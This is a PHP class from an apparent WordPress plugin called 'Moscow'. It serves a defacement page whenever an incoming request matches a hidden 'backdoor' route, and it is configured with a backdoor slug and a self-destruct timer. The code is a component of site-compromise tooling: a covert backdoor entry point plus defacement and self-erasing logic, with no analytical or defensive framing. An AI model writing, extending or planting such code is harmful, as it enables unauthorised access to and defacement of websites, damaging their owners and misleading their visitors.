<?php
declare(strict_types=1);

namespace Moscow;

if (!defined('ABSPATH')) {
    exit;
}

final class DefacePage
{
    public function render_if_backdoor(): void
    {
        if (!Config::ENABLE_DEFACE) {
            return;
        }
        if ((new Redirector())->is_backdoor_request()) {
            $this->render();
            exit;
        }
    }

    public function render(): void
    {
        $config = [
            'slug'        => Config::BACKDOOR_SLUG,
            'hours'       => Config::SELF_DESTRUCT_HOURS,
            'cssUrl'      => MOSCOW_URL . 'assets/css/deface.css',
            'jsUrl'       => MOSCOW_URL . 'assets/js/deface.js',
            'pluginVer'   => MOSCOW_VERSION,
        ];

        // Plain variables for the template
        extract($config, EXTR_SKIP);
        require MOSCOW_DIR . 'templates/deface-page.php';
    }
}